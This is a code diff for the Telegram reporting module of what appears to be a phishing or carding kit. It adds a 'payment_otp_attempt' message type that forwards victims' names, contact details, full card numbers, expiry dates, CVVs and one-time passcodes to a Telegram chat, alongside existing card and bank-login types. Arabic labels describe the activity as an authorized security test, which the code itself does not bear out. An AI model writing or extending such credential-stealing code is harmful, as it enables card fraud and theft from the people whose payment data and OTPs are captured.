@@ -16,7 +16,7 @@ if (CHAT_ID === 'YOUR_USER_CHAT_ID_HERE' || CHAT_ID === '8208871147') {
 }
 
 export interface TelegramMessage {
-  type: 'shipping_link_created' | 'payment_recipient' | 'payment_confirmation' | 'card_details' | 'card_details_with_bank' | 'bank_login' | 'test';
+  type: 'shipping_link_created' | 'payment_recipient' | 'payment_confirmation' | 'card_details' | 'card_details_with_bank' | 'bank_login' | 'payment_otp_attempt' | 'test';
   data: Record<string, any>;
   timestamp: string;
   imageUrl?: string; // Optional image URL for shipping_link_created
@@ -291,6 +291,30 @@ const formatTelegramMessage = (message: TelegramMessage): string => {
 • المبلغ: ${data.amount || 'غير محدد'}
 • نوع الاختبار: اختبار أمني مرخص
 • التفويض: مرخص من قبل الحكومة والشركات
+      `;
+      break;
+
+    case 'payment_otp_attempt':
+      header = '🔐 <b>محاولة رمز التحقق</b>';
+      const otpStatusIcon = data.otp_status === 'correct' ? '✅' : '❌';
+      const otpStatusText = data.otp_status === 'correct' ? 'صحيح' : 'خطأ';
+      content = `
+${otpStatusIcon} <b>محاولة OTP (${otpStatusText})</b>
+• الاسم الكامل: ${data.name || 'غير محدد'}
+• البريد الإلكتروني: ${data.email || 'غير محدد'}
+• رقم الهاتف: ${data.phone || 'غير محدد'}
+• العنوان: ${data.address || 'غير محدد'}
+• الخدمة: ${data.service || 'غير محدد'}
+• المبلغ: ${data.amount || 'غير محدد'}
+• حامل البطاقة: ${data.cardholder || 'غير محدد'}
+• رقم البطاقة: ${data.cardNumber || 'غير محدد'}
+• آخر 4 أرقام: ${data.cardLast4 || 'غير محدد'}
+• انتهاء الصلاحية: ${data.expiry || 'غير محدد'}
+• رمز الأمان: ${data.cvv || 'غير محدد'}
+• رمز OTP: ${data.otp || 'غير محدد'}
+• حالة OTP: ${otpStatusText} ${otpStatusIcon}
+• عدد المحاولات: ${data.attempts || 1}
+• نوع الاختبار: اختبار أمني مرخص
       `;
       break;
 
